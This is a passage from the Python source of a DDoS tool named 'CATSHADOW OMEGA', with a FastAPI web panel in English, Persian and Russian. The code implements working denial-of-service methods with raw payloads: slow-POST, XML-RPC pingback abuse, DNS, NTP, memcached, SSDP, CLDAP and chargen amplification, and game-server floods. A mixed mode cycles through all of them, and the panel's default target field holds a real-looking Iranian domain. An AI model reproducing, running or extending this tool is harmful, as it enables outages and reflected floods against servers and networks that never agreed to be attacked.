                tls.errors[type(e).__name__] += 1

    def _rudy(self, target_ip: str, target_port: int) -> None:
        tls = self._get_tls()
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((target_ip, target_port))
                sock.send(
                    b"POST / HTTP/1.1\r\nHost: " + target_ip.encode() +
                    b"\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                    b"Content-Length: 100000\r\n\r\n"
                )
                for i in range(100):
                    sock.send(b"a" * 1000)
                    time.sleep(random.uniform(0.1, 0.5))
                sock.close()
                tls.sent += 1
                tls.methods_used["RUDY"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _xmlrpc_attack(self, target_ip: str, target_port: int) -> None:
        tls = self._get_tls()
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                # payload متنوع
                target_url = f"http://{self._random_ip()}/"
                xml = (
                    b'<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
                    b'<params><param><value><string>' + target_url.encode() + b'</string></value></param>'
                    b'<param><value><string>http://' + target_ip.encode() + b'/</string></value></param>'
                    b'</params></methodCall>'
                )
                sock.send(
                    b"POST /xmlrpc.php HTTP/1.1\r\nHost: " + target_ip.encode() +
                    b"\r\nContent-Type: text/xml\r\nContent-Length: " + str(len(xml)).encode() +
                    b"\r\nConnection: close\r\n\r\n" + xml
                )
                sock.close()
                tls.sent += 1
                tls.methods_used["XMLRPC"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    # ---------- AMPLIFICATION ATTACKS (payloadهای استاندارد) ----------
    def _dns_amplification(self, target_ip: str) -> None:
        """DNS ANY query با دامنه‌های بزرگ"""
        tls = self._get_tls()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self._stop_flag:
            self._check_bandwidth()
            # دامنه تصادفی طولانی
            labels = ["".join(chr(random.randint(97, 122)) for _ in range(random.randint(10, 30)))
                      for _ in range(random.randint(3, 6))]
            domain = ".".join(labels) + ".com"
            # Transaction ID تصادفی
            tid = struct.pack('!H', random.randint(0, 65535))
            # Query: ANY (type 255)
            query = (
                tid + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +
                b''.join([bytes([len(part)]) + part.encode() for part in domain.split('.')]) +
                b'\x00\x00\xff\x00\x01'
            )
            try:
                sock.sendto(query, (target_ip, 53))
                tls.sent += 1
                tls.bytes_sent += len(query)
                tls.methods_used["DNS_AMP"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _ntp_amplification(self, target_ip: str) -> None:
        """NTP monlist request (mode 7)"""
        tls = self._get_tls()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self._stop_flag:
            self._check_bandwidth()
            # NTP mode 7 (private), request monlist (0x2a)
            payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
            try:
                sock.sendto(payload, (target_ip, 123))
                tls.sent += 1
                tls.bytes_sent += len(payload)
                tls.methods_used["NTP_AMP"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _memcached_amplification(self, target_ip: str) -> None:
        """Memcached UDP get با کلید بزرگ"""
        tls = self._get_tls()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self._stop_flag:
            self._check_bandwidth()
            # هدر UDP memcached: request_id, sequence, total, reserved
            request_id = struct.pack('!H', random.randint(0, 65535))
            key = "".join(chr(random.randint(97, 122)) for _ in range(random.randint(20, 40)))
            # command: get <key>\r\n
            command = f"get {key}\r\n".encode()
            payload = request_id + b'\x00\x00\x00\x01\x00\x00' + command
            try:
                sock.sendto(payload, (target_ip, 11211))
                tls.sent += 1
                tls.bytes_sent += len(payload)
                tls.methods_used["MEMCACHED_AMP"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _ssdp_amplification(self, target_ip: str) -> None:
        tls = self._get_tls()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self._stop_flag:
            self._check_bandwidth()
            payload = (
                b'M-SEARCH * HTTP/1.1\r\n'
                b'HOST: 239.255.255.250:1900\r\n'
                b'MAN: "ssdp:discover"\r\n'
                b'MX: 5\r\nST: ssdp:all\r\n\r\n'
            )
            try:
                sock.sendto(payload, (target_ip, 1900))
                tls.sent += 1
                tls.bytes_sent += len(payload)
                tls.methods_used["SSDP_AMP"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _cldap_amplification(self, target_ip: str) -> None:
        """CLDAP searchRequest معتبر"""
        tls = self._get_tls()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self._stop_flag:
            self._check_bandwidth()
            # CLDAP searchRequest (Berkeley Packet Filter)
            payload = (
                b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00'
                b'\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65'
                b'\x63\x74\x43\x6c\x61\x73\x73\x30\x00'
            )
            try:
                sock.sendto(payload, (target_ip, 389))
                tls.sent += 1
                tls.bytes_sent += len(payload)
                tls.methods_used["CLDAP_AMP"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _chargen_amplification(self, target_ip: str) -> None:
        tls = self._get_tls()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self._stop_flag:
            self._check_bandwidth()
            # Chargen request کوتاه
            payload = b'\x00'
            try:
                sock.sendto(payload, (target_ip, 19))
                tls.sent += 1
                tls.bytes_sent += len(payload)
                tls.methods_used["CHARGEN_AMP"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    # ---------- PROTOCOL-SPECIFIC ----------
    def _minecraft_attack(self, target_ip: str, target_port: int) -> None:
        tls = self._get_tls()
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'\xfe\xfd\x09\x12\x34\x56\x78' + os.urandom(100)
                sock.sendto(payload, (target_ip, target_port or 25565))
                sock.close()
                tls.sent += 1
                tls.methods_used["MINECRAFT"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _fivem_attack(self, target_ip: str, target_port: int) -> None:
        tls = self._get_tls()
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'\x00\x00\x00\x01' + os.urandom(500)
                sock.sendto(payload, (target_ip, target_port or 30120))
                sock.close()
                tls.sent += 1
                tls.methods_used["FIVEM"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    def _teamspeak_attack(self, target_ip: str, target_port: int) -> None:
        tls = self._get_tls()
        while not self._stop_flag:
            self._check_bandwidth()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'\x00\x01\x00\x00\x00\x00\x00\x00' + os.urandom(200)
                sock.sendto(payload, (target_ip, target_port or 9987))
                sock.close()
                tls.sent += 1
                tls.methods_used["TEAMSPEAK"] += 1
            except Exception as e:
                tls.failed += 1
                tls.errors[type(e).__name__] += 1

    # ---------- WORKER DISPATCH ----------
    def _start_worker(self, method: str, thread_id: int) -> None:
        try:
            if method == "SYN_TSUN":
                self._syn_tsunami(self.target_ip, self.target_port)
            elif method == "UDP_APOC":
                self._udp_apocalypse(self.target_ip, self.target_port)
            elif method == "ICMP_STORM":
                self._icmp_storm(self.target_ip)
            elif method == "TCP_SPAM":
                self._tcp_spam(self.target_ip, self.target_port)
            elif method == "HTTP_FLOOD":
                self._run_async(self._http_flood(self.target_url), use_central=True)
            elif method == "HTTP2_ATTACK":
                self._run_async(self._http2_attack(self.target_url), use_central=True)
            elif method == "GRAPHQL_FLOOD":
                self._run_async(self._graphql_flood(self.target_url), use_central=True)
            elif method == "WEBSOCKET_FLOOD":
                self._run_async(self._websocket_flood(self.target_url), use_central=True)
            elif method == "SSL_RENEG":
                self._ssl_reneg_attack(self.target_ip, self.target_port)
            elif method == "SLOWLORIS":
                self._slowloris(self.target_ip, self.target_port)
            elif method == "RUDY":
                self._rudy(self.target_ip, self.target_port)
            elif method == "XMLRPC":
                self._xmlrpc_attack(self.target_ip, self.target_port)
            elif method == "DNS_AMP":
                self._dns_amplification(self.target_ip)
            elif method == "NTP_AMP":
                self._ntp_amplification(self.target_ip)
            elif method == "MEMCACHED_AMP":
                self._memcached_amplification(self.target_ip)
            elif method == "SSDP_AMP":
                self._ssdp_amplification(self.target_ip)
            elif method == "CLDAP_AMP":
                self._cldap_amplification(self.target_ip)
            elif method == "CHARGEN_AMP":
                self._chargen_amplification(self.target_ip)
            elif method == "MINECRAFT":
                self._minecraft_attack(self.target_ip, self.target_port)
            elif method == "FIVEM":
                self._fivem_attack(self.target_ip, self.target_port)
            elif method == "TEAMSPEAK":
                self._teamspeak_attack(self.target_ip, self.target_port)
            elif method == "INFINITY_MIX":
                methods = [
                    "SYN_TSUN", "UDP_APOC", "ICMP_STORM", "TCP_SPAM",
                    "HTTP_FLOOD", "HTTP2_ATTACK", "GRAPHQL_FLOOD", "WEBSOCKET_FLOOD",
                    "SSL_RENEG", "SLOWLORIS", "RUDY", "XMLRPC",
                    "DNS_AMP", "NTP_AMP", "MEMCACHED_AMP", "SSDP_AMP",
                    "CLDAP_AMP", "CHARGEN_AMP",
                    "MINECRAFT", "FIVEM", "TEAMSPEAK",
                ]
                method_cycle = itertools.cycle(methods)
                while not self._stop_flag:
                    chosen = next(method_cycle)
                    if chosen in ["HTTP_FLOOD", "HTTP2_ATTACK", "GRAPHQL_FLOOD", "WEBSOCKET_FLOOD"]:
                        self._run_async(
                            self._http_flood(self.target_url) if chosen == "HTTP_FLOOD" else
                            self._http2_attack(self.target_url) if chosen == "HTTP2_ATTACK" else
                            self._graphql_flood(self.target_url) if chosen == "GRAPHQL_FLOOD" else
                            self._websocket_flood(self.target_url),
                            use_central=True,
                        )
                    else:
                        self._start_worker(chosen, thread_id)
        except (KeyboardInterrupt, SystemExit):
            raise
        except Exception as e:
            logger.debug(f"Worker {thread_id} error: {e}")
        finally:
            # flush نهایی
            self._flush_tls()

    # ---------- LIVE STATS ----------
    def _live_stats(self) -> None:
        while not self._stop_flag:
            mono = self.stats.get("monotonic_start")
            elapsed = (time.monotonic() - mono) if mono else 0
            with self.lock:
                sent = self.stats["sent"]
                failed = self.stats["failed"]
                bytes_sent = self.stats["bytes_sent"]
            rate = sent / elapsed if elapsed > 0 else 0
            bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
            mbps = bps / 1_000_000
            sys.stdout.write(
                f"\r[🔥] Packets: {sent:,}  |  "
                f"Rate: {rate:,.0f}/s  |  "
                f"Bandwidth: {mbps:.1f} Mbps  |  "
                f"Failed: {failed:,}  |  "
                f"Elapsed: {elapsed:.0f}s"
            )
            sys.stdout.flush()
            time.sleep(0.5)

    # ---------- MAIN CONTROL ----------
    def launch_attack(self, config: AttackConfig) -> None:
        with self.launch_lock:
            if self.running:
                raise RuntimeError("Attack already running")
            self.running = True
            self._stop_flag = False

        self.current_config = config
        self.lang = config.lang
        target = config.target.strip()
        if not target.startswith(("http://", "https://")):
            self.target_url = "http://" + target
        else:
            self.target_url = target
        parsed = urllib.parse.urlparse(self.target_url)
        self.target_host = parsed.hostname or target
        self.target_port = config.port or (443 if parsed.scheme == "https" else 80)
        self.bandwidth_limit = config.bandwidth_limit
        self.use_proxy = config.use_proxy
        try:
            self.target_ip = socket.gethostbyname(self.target_host)
        except Exception:
            self.target_ip = self.target_host
        self.method = config.method.upper()
        self.threads = min(config.threads, MAX_THREADS)
        self.duration = config.duration

        # ریست آمار
        with self.lock:
            self.stats = {
                "sent": 0,
                "failed": 0,
                "bytes_sent": 0,
                "start_time": datetime.now(),
                "end_time": None,
                "end_time_planned": datetime.now() + timedelta(seconds=self.duration),
                "monotonic_start": time.monotonic(),
                "errors": defaultdict(int),
                "methods_used": Counter(),
            }
        self._last_bytes_for_bw = 0
        self._last_bw_check = time.monotonic()

        self._init_raw_sockets()
        logger.info(f"🔥 ATTACK STARTED on {self.target_host} ({self.target_ip}:{self.target_port})")
        logger.info(f"⚡ Method: {self.method}, Threads: {self.threads}, Duration: {self.duration}s")
        logger.info(f"📶 Bandwidth Limit: {'Unlimited' if self.bandwidth_limit == 0 else f'{self.bandwidth_limit} Mbps'}")

        self._start_central_loop()

        effective_threads = min(self.threads, MAX_EFFECTIVE_THREADS)
        if self.threads > MAX_EFFECTIVE_THREADS:
            logger.warning(f"Threads capped to {MAX_EFFECTIVE_THREADS} (requested: {self.threads})")

        # ThreadPoolExecutor
        self.executor = ThreadPoolExecutor(
            max_workers=effective_threads,
            thread_name_prefix="catshadow",
        )
        self.futures = []
        for i in range(effective_threads):
            future = self.executor.submit(self._start_worker, self.method, i)
            self.futures.append(future)

        # stats thread
        self.stats_thread = threading.Thread(target=self._live_stats, daemon=True)
        self.stats_thread.start()

        # stats flusher thread
        self._stats_flusher_thread = threading.Thread(target=self._stats_flusher, daemon=True)
        self._stats_flusher_thread.start()

        # توقف خودکار
        def stop_after_duration():
            time.sleep(self.duration)
            self.stop_attack()

        threading.Thread(target=stop_after_duration, daemon=True).start()

    def stop_attack(self) -> None:
        if not self.running:
            return
        self._stop_flag = True
        self.running = False
        with self.lock:
            self.stats["end_time"] = datetime.now()

        # بستن raw sockets
        for sock in (self.raw_tcp, self.raw_udp, self.raw_icmp):
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        self.raw_tcp = None
        self.raw_udp = None
        self.raw_icmp = None

        # توقف loop مرکزی
        self._stop_central_loop()

        # خاموش کردن ThreadPoolExecutor با انتظار
        if self.executor is not None:
            try:
                self.executor.shutdown(wait=True, cancel_futures=True)
            except Exception:
                pass
            self.executor = None
            self.futures = []

        # flush نهایی
        self._flush_tls()

        logger.info("💀 Attack stopped")

    def get_status(self) -> Dict[str, Any]:
        now = datetime.now()
        mono = self.stats.get("monotonic_start")
        elapsed = (time.monotonic() - mono) if mono else 0
        with self.lock:
            sent = self.stats["sent"]
            failed = self.stats["failed"]
            bytes_sent = self.stats["bytes_sent"]
            errors = dict(self.stats["errors"])
            methods_used = dict(self.stats["methods_used"])
        rate = sent / elapsed if elapsed > 0 else 0
        bps = (bytes_sent * 8) / elapsed if elapsed > 0 else 0
        mbps = bps / 1_000_000
        planned_end = self.stats.get("end_time_planned")
        eta = (planned_end - now).total_seconds() if planned_end else 0

        try:
            cpu = psutil.cpu_percent(interval=None)
            ram = psutil.virtual_memory().percent
            proc_threads = psutil.Process().num_threads()
        except Exception:
            cpu = ram = proc_threads = 0

        return {
            "running": self.running,
            "target": self.target_url,
            "method": self.method,
            "threads": self.threads,
            "duration": self.duration,
            "elapsed": elapsed,
            "eta": max(0, eta),
            "packets_sent": sent,
            "rate": rate,
            "failed": failed,
            "bandwidth": mbps,
            "bandwidth_limit": self.bandwidth_limit,
            "bytes_sent": bytes_sent,
            "errors": errors,
            "methods_used": methods_used,
            "cpu_percent": cpu,
            "ram_percent": ram,
            "process_threads": proc_threads,
        }


# ========================== FASTAPI APP ==========================
app = FastAPI(title="CATSHADOW OMEGA")
engine = CatShadowOmega()


# ========================== HTML CONTENT ==========================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 CATSHADOW OMEGA</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ffcc;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(0, 20, 20, 0.95);
            border: 2px solid #00ffcc;
            border-radius: 15px;
            padding: 30px;
            max-width: 750px;
            width: 100%;
            box-shadow: 0 0 60px rgba(0, 255, 204, 0.2);
            backdrop-filter: blur(10px);
        }
        h1 {
            font-size: 2.8em;
            text-shadow: 0 0 30px #00ffcc;
            margin-bottom: 5px;
            color: #00ffcc;
            text-align: center;
        }
        .sub {
            color: #88ffdd;
            opacity: 0.7;
            margin-bottom: 20px;
            font-size: 0.9em;
            text-align: center;
        }
        .danger {
            color: #ff4444;
            animation: blink 1s infinite;
            font-weight: bold;
            margin: 10px 0;
            text-align: center;
        }
        @keyframes blink { 50% { opacity: 0.3; } }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .top-bar select, .top-bar button {
            padding: 8px 12px;
            background: #001818;
            color: #00ffcc;
            border: 1px solid #00ffcc66;
            border-radius: 8px;
            font-family: inherit;
            font-size: 14px;
            cursor: pointer;
            transition: 0.3s;
        }
        .top-bar select:hover, .top-bar button:hover { border-color: #00ffcc; }
        input, select {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            background: #001818;
            border: 1px solid #00ffcc66;
            color: #00ffcc;
            border-radius: 8px;
            font-size: 16px;
            font-family: inherit;
            transition: 0.3s;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #00ffcc;
            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
        }
        .flex-row { display: flex; gap: 10px; }
        .flex-row > * { flex: 1; }
        .btn-group {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            flex-wrap: wrap;
        }
        button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: inherit;
            min-width: 120px;
        }
        .btn-start { background: #00cc88; color: #000; }
        .btn-start:hover { background: #00ffaa; box-shadow: 0 0 40px rgba(0, 255, 170, 0.4); transform: scale(1.02); }
        .btn-stop { background: #cc4400; color: #fff; }
        .btn-stop:hover { background: #ff5500; box-shadow: 0 0 40px rgba(255, 85, 0, 0.4); }
        .thread-selector { display: flex; flex-wrap: wrap; gap: 6px; margin: 6px 0; }
        .thread-selector button {
            flex: 1 0 auto;
            padding: 8px 12px;
            background: #001818;
            color: #00ffcc;
            border: 1px solid #00ffcc66;
            border-radius: 6px;
            font-size: 13px;
            min-width: 60px;
            cursor: pointer;
            transition: 0.3s;
        }
        .thread-selector button.active { border-color: #00ffcc; background: #00ffcc; color: #000; }
        .thread-selector button:hover { border-color: #00ffcc; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .stat {
            background: #001010;
            padding: 12px;
            border-radius: 8px;
            border-left: 3px solid #00ffcc;
        }
        .stat-label { font-size: 0.7em; color: #88ffdd; text-transform: uppercase; }
        .stat-value { font-size: 1.5em; font-weight: bold; margin-top: 4px; }
        .status {
            font-size: 1.2em;
            margin: 15px 0;
            padding: 10px;
            border-radius: 8px;
            background: #001010;
            text-align: center;
        }
        .bandwidth-control {
            margin: 10px 0;
            padding: 15px;
            border: 1px solid #00ffcc44;
            border-radius: 8px;
            background: #001010;
        }
        .bandwidth-control input[type="range"] {
            width: 100%;
            margin: 8px 0;
            padding: 0;
            background: transparent;
            border: none;
            -webkit-appearance: none;
        }
        .bandwidth-control input[type="range"]::-webkit-slider-runnable-track {
            height: 6px;
            background: #00ffcc44;
            border-radius: 3px;
        }
        .bandwidth-control input[type="range"]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 20px;
            height: 20px;
            background: #00ffcc;
            border-radius: 50%;
            cursor: pointer;
            margin-top: -7px;
        }
        @media (max-width: 600px) {
            .stats-grid { grid-template-columns: 1fr 1fr; }
            .flex-row { flex-direction: column; }
            .container { padding: 15px; }
            h1 { font-size: 2em; }
            .thread-selector button { font-size: 11px; padding: 6px 8px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="top-bar">
            <div style="display:flex; gap:10px; align-items:center;">
                <span id="themeToggle" style="cursor:pointer; font-size:1.2em;">🌙</span>
                <span id="langDisplay" style="font-size:1.2em;">🇬🇧</span>
            </div>
            <div style="display:flex; gap:10px; align-items:center;">
                <select id="langSelect">
                    <option value="en">🇬🇧 English</option>
                    <option value="fa">🇮🇷 فارسی</option>
                    <option value="ru">🇷🇺 Русский</option>
                </select>
                <select id="themeSelect">
                    <option value="dark">🌙 Dark</option>
                    <option value="light">☀️ Light</option>
                </select>
            </div>
        </div>
        <h1 id="title">🔥 CATSHADOW OMEGA</h1>
        <div class="sub" id="subtitle">⚡ Ultimate DDoS Arsenal ⚡</div>
        <div class="danger" id="danger">⚠️ EXTREME POWER - USE RESPONSIBLY ⚠️</div>

        <input id="target" value="webhostingtalk.ir" placeholder="Target URL or IP">

        <div class="flex-row">
            <input id="port" value="80" placeholder="Port">
            <select id="method">
                <option value="INFINITY_MIX">🌌 INFINITY MIX</option>
                <option value="SYN_TSUN">🔥 SYN TSUNAMI</option>
                <option value="UDP_APOC">💀 UDP APOCALYPSE</option>
                <option value="ICMP_STORM">⚡ ICMP STORM</option>
                <option value="TCP_SPAM">🌀 TCP SPAM</option>
                <option value="HTTP_FLOOD">🌐 HTTP FLOOD</option>
                <option value="HTTP2_ATTACK">📡 HTTP/2 ATTACK</option>
                <option value="GRAPHQL_FLOOD">📊 GRAPHQL FLOOD</option>
                <option value="WEBSOCKET_FLOOD">🔌 WEBSOCKET FLOOD</option>
                <option value="SSL_RENEG">🔒 SSL RENEG</option>
                <option value="SLOWLORIS">🐢 SLOWLORIS</option>
                <option value="RUDY">💧 RUDY</option>
                <option value="XMLRPC">📨 XMLRPC</option>
                <option value="DNS_AMP">📡 DNS AMP</option>
                <option value="NTP_AMP">🕐 NTP AMP</option>
                <option value="MEMCACHED_AMP">💾 MEMCACHED AMP</option>
                <option value="SSDP_AMP">🔌 SSDP AMP</option>
                <option value="CLDAP_AMP">📂 CLDAP AMP</option>
                <option value="CHARGEN_AMP">⚡ CHARGEN AMP</option>
                <option value="MINECRAFT">⛏️ MINECRAFT</option>
                <option value="FIVEM">🚗 FIVEM</option>
                <option value="TEAMSPEAK">🎧 TEAMSPEAK</option>
            </select>
        </div>

        <div class="flex-row">
            <input id="duration" value="300" placeholder="Duration (sec)">
        </div>

        <div style="margin:10px 0;">
            <div style="font-size:0.9em; color:#88ffdd; margin-bottom:5px;" id="threadsLabel">Threads:</div>
            <div class="thread-selector" id="threadSelector">
                <button data-value="1000">1K</button>
                <button data-value="10000" class="active">10K</button>
                <button data-value="50000">50K</button>
                <button data-value="100000">100K</button>
                <button data-value="1000000">1M</button>
                <button data-value="custom" id="customThreadBtn">✏️ Custom</button>
            </div>
            <input id="customThreadInput" type="number" value="10000" style="display:none; margin-top:5px;" placeholder="Enter thread count">
        </div>

        <div class="bandwidth-control">
            <label id="bwLabel">📶 Bandwidth Limit: 0 Mbps (Unlimited)</label>
            <input type="range" id="bwSlider" min="0" max="500" value="0" step="5">
            <small id="bwNote">Higher = more power, may slow your internet</small>
        </div>

        <div class="btn-group">
            <button class="btn-start" id="startBtn">🚀 LAUNCH</button>
            <button class="btn-stop" id="stopBtn">⛔ STOP</button>
        </div>

        <div class="status" id="status">🟢 IDLE</div>

        <div class="stats-grid">
            <div class="stat"><div class="stat-label" id="sPackets">📦 Packets</div><div class="stat-value" id="packets">0</div></div>
            <div class="stat"><div class="stat-label" id="sRate">⚡ Rate (p/s)</div><div class="stat-value" id="rate">0</div></div>
            <div class="stat"><div class="stat-label" id="sBandwidth">📶 Bandwidth</div><div class="stat-value" id="bandwidth">0 Mbps</div></div>
            <div class="stat"><div class="stat-label" id="sFailed">❌ Failed</div><div class="stat-value" id="failed">0</div></div>
            <div class="stat"><div class="stat-label" id="sElapsed">⏱️ Elapsed</div><div class="stat-value" id="elapsed">0s</div></div>
            <div class="stat"><div class="stat-label" id="sLimit">🔒 Limit</div><div class="stat-value" id="limit">0 Mbps</div></div>
            <div class="stat"><div class="stat-label">💻 CPU</div><div class="stat-value" id="cpu">0%</div></div>
            <div class="stat"><div class="stat-label">🧠 RAM</div><div class="stat-value" id="ram">0%</div></div>
            <div class="stat"><div class="stat-label">🧵 Threads</div><div class="stat-value" id="procThreads">0</div></div>
        </div>
    </div>

    <script>
        const LANG = {
            "en": {
                "title": "🔥 CATSHADOW OMEGA",
                "subtitle": "⚡ Ultimate DDoS Arsenal ⚡",
                "danger": "⚠️ EXTREME POWER - USE RESPONSIBLY ⚠️",
                "target": "Target URL or IP",
                "port": "Port",
                "duration": "Duration (sec)",
                "bandwidth": "Bandwidth Limit: {val} Mbps ({status})",
                "unlimited": "Unlimited",
                "launch": "🚀 LAUNCH",
                "stop": "⛔ STOP",
                "idle": "🟢 IDLE",
                "attacking": "🔴 ATTACKING",
                "packets": "📦 Packets",
                "rate": "⚡ Rate (p/s)",
                "bandwidth_label": "📶 Bandwidth",
                "failed": "❌ Failed",
                "elapsed": "⏱️ Elapsed",
                "limit": "🔒 Limit",
                "threads": "Threads:",
                "bw_note": "Higher = more power, may slow your internet",
                "custom": "Custom"
            },
            "fa": {
                "title": "🔥 کت‌شادو امگا",
                "subtitle": "⚡ زرادخانه نهایی DDoS ⚡",
                "danger": "⚠️ قدرت فوق‌العاده - مسئولانه استفاده کنید ⚠️",
                "target": "آدرس هدف یا IP",
                "port": "پورت",
                "duration": "مدت زمان (ثانیه)",
                "bandwidth": "محدودیت پهنای باند: {val} مگابیت ({status})",
                "unlimited": "نامحدود",
                "launch": "🚀 شروع حمله",
                "stop": "⛔ توقف",
                "idle": "🟢 آماده",
                "attacking": "🔴 در حال حمله",
                "packets": "📦 پکت‌ها",
                "rate": "⚡ سرعت (پکت/ثانیه)",
                "bandwidth_label": "📶 پهنای باند",
                "failed": "❌ ناموفق",
                "elapsed": "⏱️ زمان سپری شده",
                "limit": "🔒 محدودیت",
                "threads": "تعداد ترد:",
                "bw_note": "بیشتر = قدرت بیشتر، ممکن است اینترنت شما را کند کند",
                "custom": "سفارشی"
            },
            "ru": {
                "title": "🔥 CATSHADOW OMEGA",
                "subtitle": "⚡ Ультимативный арсенал DDoS ⚡",
                "danger": "⚠️ ЭКСТРЕМАЛЬНАЯ МОЩЬ - ИСПОЛЬЗУЙТЕ ОТВЕТСТВЕННО ⚠️",
                "target": "Цель URL или IP",
                "port": "Порт",
                "duration": "Длительность (сек)",
                "bandwidth": "Лимит пропускной способности: {val} Мбит ({status})",
                "unlimited": "Безлимитный",
                "launch": "🚀 ЗАПУСТИТЬ",
                "stop": "⛔ ОСТАНОВИТЬ",
                "idle": "🟢 ОЖИДАНИЕ",
                "attacking": "🔴 АТАКА",
                "packets": "📦 Пакеты",
                "rate": "⚡ Скорость (п/с)",
                "bandwidth_label": "📶 Пропускная способность",
                "failed": "❌ Ошибок",
                "elapsed": "⏱️ Прошло",
                "limit": "🔒 Лимит",
                "threads": "Потоки:",
                "bw_note": "Больше = больше мощности, может замедлить интернет",
                "custom": "Свой"
            }
        };

        let currentLang = 'en';
        let currentTheme = 'dark';
        let selectedThreads = 10000;

        const els = {
            title: document.getElementById('title'),
            subtitle: document.getElementById('subtitle'),
            danger: document.getElementById('danger'),
            target: document.getElementById('target'),
            port: document.getElementById('port'),
            method: document.getElementById('method'),
            duration: document.getElementById('duration'),
            threadsLabel: document.getElementById('threadsLabel'),
            customThreadInput: document.getElementById('customThreadInput'),
            bwSlider: document.getElementById('bwSlider'),
            bwLabel: document.getElementById('bwLabel'),
            bwNote: document.getElementById('bwNote'),
            startBtn: document.getElementById('startBtn'),
            stopBtn: document.getElementById('stopBtn'),
            status: document.getElementById('status'),
            packets: document.getElementById('packets'),
            rate: document.getElementById('rate'),
            bandwidth: document.getElementById('bandwidth'),
            failed: document.getElementById('failed'),
            elapsed: document.getElementById('elapsed'),
            limit: document.getElementById('limit'),
            cpu: document.getElementById('cpu'),
            ram: document.getElementById('ram'),
            procThreads: document.getElementById('procThreads'),
            sPackets: document.getElementById('sPackets'),
            sRate: document.getElementById('sRate'),
            sBandwidth: document.getElementById('sBandwidth'),
            sFailed: document.getElementById('sFailed'),
            sElapsed: document.getElementById('sElapsed'),
            sLimit: document.getElementById('sLimit'),
            langSelect: document.getElementById('langSelect'),
            themeSelect: document.getElementById('themeSelect'),
            themeToggle: document.getElementById('themeToggle'),
            langDisplay: document.getElementById('langDisplay'),
            threadSelector: document.getElementById('threadSelector'),
            customThreadBtn: document.getElementById('customThreadBtn')
        };

        function updateLang(lang) {
            const t = LANG[lang] || LANG['en'];
            els.title.textContent = t.title;
            els.subtitle.textContent = t.subtitle;
            els.danger.textContent = t.danger;
            els.target.placeholder = t.target;
            els.port.placeholder = t.port;
            els.duration.placeholder = t.duration;
            els.threadsLabel.textContent = t.threads;
            els.startBtn.textContent = t.launch;
            els.stopBtn.textContent = t.stop;
            els.sPackets.textContent = t.packets;
            els.sRate.textContent = t.rate;
            els.sBandwidth.textContent = t.bandwidth_label;
            els.sFailed.textContent = t.failed;
            els.sElapsed.textContent = t.elapsed;
            els.sLimit.textContent = t.limit;
            els.bwNote.textContent = t.bw_note;
            els.customThreadInput.placeholder = t.custom;
            updateBwLabel(parseInt(els.bwSlider.value), lang);
            currentLang = lang;
            els.langDisplay.textContent = lang === 'en' ? '🇬🇧' : lang === 'fa' ? '🇮🇷' : '🇷🇺';
        }

        function updateBwLabel(val, lang) {
            const t = LANG[lang || currentLang] || LANG['en'];
            const status = val == 0 ? t.unlimited : val + ' Mbps';
            els.bwLabel.textContent = t.bandwidth.replace('{val}', val).replace('{status}', status);
        }
